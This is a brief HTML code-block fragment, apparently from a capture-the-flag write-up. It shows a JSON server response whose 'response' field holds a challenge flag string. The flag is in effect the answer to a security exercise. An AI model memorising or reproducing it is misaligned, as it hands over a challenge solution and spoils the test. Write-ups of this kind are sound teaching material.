+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token builtin class-name">:</span><span class="token string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="token string">"response"</span><span class="token builtin class-name">:</span><span class="token string">"flag&#123;18d44fc0707ac8dc8be45bb83db54013&#125;<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
       
        
     </div>
